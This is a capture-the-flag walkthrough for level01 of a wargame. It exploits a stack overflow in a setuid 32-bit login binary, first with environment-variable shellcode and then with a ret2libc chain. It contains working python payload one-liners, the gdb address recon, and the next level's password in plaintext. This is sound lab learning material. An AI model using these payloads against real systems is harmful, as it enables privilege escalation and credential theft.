# level01

### First analysis

Let's analyse the code and checksec of the binary for level01. For the checksec we can observe this:

```sh
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level01/level01
```

So again we can see that we have a partial RELRO, however this time NX is deactivated, which means the very powerfull method we found in RainFall with the env variable could potentially work. Let's analyse the code to see if it is the kind to use this method:

```c
int verify_user_name(void) {
    puts("verifying username....\n");
    return memcmp(a_user_name, "dat_wil", 7);
}

int verify_user_pass(char *password) {
    return memcmp(password, "admin", 5);
}

int main(void) {
    char    password[64];
    int     pass_verified;

    puts("********* ADMIN LOGIN PROMPT *********");
    printf("Enter Username: ");
    fgets(a_user_name, 256, stdin);

    if (verify_user_name()) {
        puts("nope, incorrect username...\n");
        return 1;
    }

    puts("Enter Password: ");
    fgets(password, 100, stdin);

    pass_verified = verify_user_pass(password);
    if (pass_verified || ! pass_verified) {
        puts("nope, incorrect password...\n");
        return 1;
    }

    return 0;
}
```

The code is pretty straightforward again, we get asked 2 user input, one for username, one for password. The username is a global variable, and even after 256 chars we know it can't be overflowed. It has to be equal to "dat_wil" so the code continues its execution. Then a password prompt open, and we have to enter into password, a 64 chars buffer, up to 100 chars. We can already see that 36 chars can be overflowed (probably a little less). So we tested this very quickly to see if something happen, searching for eip to be overflowed:

```sh
(gdb) r
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x75757575 in ?? ()
(gdb) info registers
eax            0x1	1
ecx            0xffffffff	-1
edx            0xf7fd08b8	-134412104
ebx            0x72727272	1920103026
esp            0xffffd510	0xffffd510
ebp            0x74747474	0x74747474
esi            0x0	0
edi            0x73737373	1936946035
eip            0x75757575	0x75757575
eflags         0x10286	[ PF SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```

By testing that we can re-construct the memory layout that interests us thanks to this info registers command. With that we understand that we have:

```
[   buffer 68   ][  ebx  ][  edi  ][  ebp  ][  eip  ]
```

Here EIP is just the address of segfault but we wanted to show more of what happen in the registers of the CPU. So we now know that there is a payload of 80 char before accessing EIP.

### Env shellcode method

We followed the exact same steps that we use to do in [RainFall](https://github.com/kbarbry/RainFall/blob/main/~bonus2/walkthrough.md) adapted to this binary however it didn't work. And we had to figure out why since everything seemed to be aligned for this method.

By searching a little more we discovered that OverRide is actually different than RainFall on several elements. The most important one is this one:

```sh
level01@OverRide:~$ uname -a
Linux OverRide 3.13.0-95-generic #142~precise1-Ubuntu SMP Fri Aug 12 18:20:15 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```

This command gives some informations about the machine and look at this element "x86_64". Where RainFall was a x86 32bit machine, here in OverRide we are in a 64bit machine. Which means addresses are now 16 char long, not just 8, this is a little part of what strace gives us: (yes we have access to strace and ltrace on this machine, that's another difference)

```sh
map2(0xf7fcd000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a0) = 0xfffffffff7fcd000
mmap2(0xf7fd0000, 10972, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7fd0000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7e2b000
```

As we can see the addresses are definitely different as RainFall. But in this case why did gdb gave us 32bit alike addresses ? Well the answer is here:

```sh
level01@OverRide:~$ file ./level01 
./level01: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x923fd646950abba3d31df70cad30a6a5ab5760e8, not stripped
```

level01 is compiled as a 32bit ELF file, in a 64bit machine. That's why we had 32bit alike addresses even while being in a 64bit machine.

Now that we know that, why our shellcode in env didn't work ? The code is still in 32bit so the shellcode should still be correct and adapted for this binary ? Well the problem does not come from the shellcode but its address. We wrote a little c file that has to print a 32bit address in little endian format of a specific env variable (accessible at [./Resources/env_address.c](https://github.com/kbarbry/OverRide/blob/main/level01/Resources/env_address.c)) but by compiling this code, we compile it as a 64bit file since it is the machine configuration. In order to print the address where this env variable would be in the context of a 32bit environment, we can compile our env_address code like this:

```sh
level01@OverRide:/tmp$ gcc -m32 -o env env_address.c 
[...]
level01@OverRide:/tmp$ ./env SHELLCODE
Searching address of SHELLCODE env variable:
Big-endian format: 0xffffd711
Lil-endian format: \x11\xd7\xff\xff
```

Some errors are printed when compiling but we can ignore them, we now have an address, but this address starts with 0xff where we are normally used to 0xbf addresses for the stack in 32bit, to verify if this make sense we can print the processor map in gdb:

```sh
(gdb) info proc map
process 1760
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
	 0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fd8000 0xf7fdb000     0x3000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
```

As we can see on this machine the stack starts in 0xffffe000 addresses. So this address we get for SHELLCODE env variable makes sense. We can now try to fill the buffer with 80 chars, then the address of the en variable: (we don't forget to enter "dat_will" first to enter the password prompt)

```sh
level01@OverRide:~$ (python -c "print 'dat_wil'"; python -c "print 'A' * 80 + '\x11\xd7\xff\xff'"; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass    
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

Here we are with the flag. However this method is starting to be a little redundant, it works well, is very powerfull but we want some new methods of exploiting buffer overflows so we searched for an alternative method.

### Ret2LibC

This method seems to be interesting, we found it in a list of exploits possible if the NX bit is enabled. It is not our case but we can still try it, so we will have a method if the NX bit is enabled on other exercises and we can't use the shellcode in env variable method.

The major difference is that instead of redirecting the return address to our shellcode (which in this scenario is on the stack and can't be executed because of the NX bit enabled), we redirect the return address to the system() function of the libc. And in this system command we will want to have "/bin/sh" as command, so system() spawns us a shell.

That's the theory, now we have to find the address of system and find how to pass "/bin/sh" as an argument of this function. This exploit is divided in 3 differents part, first we need the address of system():

```sh
(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
```

Important: We need the program to be running or the libc won't be loaded which mean no system function will be find since in our program there is no system function, this is the list of functions available before execution:

```sh
(gdb) info function
All defined functions:

Non-debugging symbols:
0x08048318  _init
0x08048360  printf
0x08048360  printf@plt
0x08048370  fgets
0x08048370  fgets@plt
0x08048380  puts
0x08048380  puts@plt
0x08048390  __gmon_start__
0x08048390  __gmon_start__@plt
0x080483a0  __libc_start_main
0x080483a0  __libc_start_main@plt
0x080483b0  _start
0x080483e0  __do_global_dtors_aux
0x08048440  frame_dummy
0x08048464  verify_user_name
0x080484a3  verify_user_pass
0x080484d0  main
0x080485c0  __libc_csu_init
0x08048630  __libc_csu_fini
0x08048632  __i686.get_pc_thunk.bx
0x08048640  __do_global_ctors_aux
0x0804866c  _fini
```

If I do the same command after the program is running (set a breakpoint in main with "b main", then "run") the list of functions available is infinitely longer because libc is now loaded. So the address of system is 0xf7e6aed0, we have the the element to overflow eip, but for now system doesn't execute anything.

Before searching for /bin/sh we also need the address of exit function, why ? Because we are creating a little stack frame for system function, and a stack frame is composed of, the address of the function, then the return address of this function, then the arguments. So we need first the address of system, them the address exit to leave the program in a clean way, then /bin/sh. Let's find the address of exit():

```sh
(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0xf7e5eb70  exit
0xf7e5eba0  on_exit
0xf7e5edb0  __cxa_atexit
0xf7e5ef50  quick_exit
0xf7e5ef80  __cxa_at_quick_exit
0xf7ee45c4  _exit
0xf7f27ec0  pthread_exit
0xf7f2d4f0  __cyg_profile_func_exit
0xf7f4bc30  svc_exit
0xf7f55d80  atexit
```

A lot of results but we just want the regular exit() function address which is 0xf7e5eb70. Now what about the /bin/sh ? Do we write /bin/sh in the memory ? Do we have to convert it in some weird code form ? Not really, /bin/sh is a common string used by a lot of libc function if executing something by bash is necessary, so we can try to find the address of this string in the libc, to start we need the address of the beginning of where libc is loaded:

```sh
(gdb) info proc map
process 1762
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
	 0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fda000 0xf7fdb000     0x1000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
```

We again use info proc map, not to check the stack this time but to take the first address where libc appears which seems to be 0xf7e2c000. We are now going to use strings function not in gdb this time, and try to find /bin/sh, it will give us an offset between the beginning of the libc and the address of /bin/sh.

```sh
level01@OverRide:~$ strings /lib32/libc-2.15.so | grep "/bin/sh"
/bin/sh
```

Okay we definitely don't have enough informations here so let's give some more arguments such as this one:

```sh
-t --radix={o,d,x}        Print the location of the string in base 8, 10 or 16
```

That we can find in the man of strings. we want it in base 16 since our address system works like this in linux:

```sh
level01@OverRide:~$ strings -t x /lib32/libc-2.15.so | grep "/bin/sh"
 15d7ec /bin/sh
```

So the address of /bin/sh string is at 0xf7e2c000 + 15d7ec = f7f897ec. We now have all the elements, so theoretically, if in our password buffer we type 80 random characters, then the address of system, then the address of exit, then the address of "/bin/sh", it should get us a bash. Let's try it:

```sh
level01@OverRide:~$ (python -c "print 'dat_wil'"; python -c "print 'A' * 80 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7'"; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

We simply converted the 3 addresses on little endian format, and we got it. This method will be used within payload.sh since it doesn't require external action like env variable etc. It is way easier.

And now we have 2 methods that seems very powerfull to exploit buffer overflows.

## Important doc

[Overflow example x86_64](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/64-bit-stack-based-buffer-overflow)
[Ret2LibC attack](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)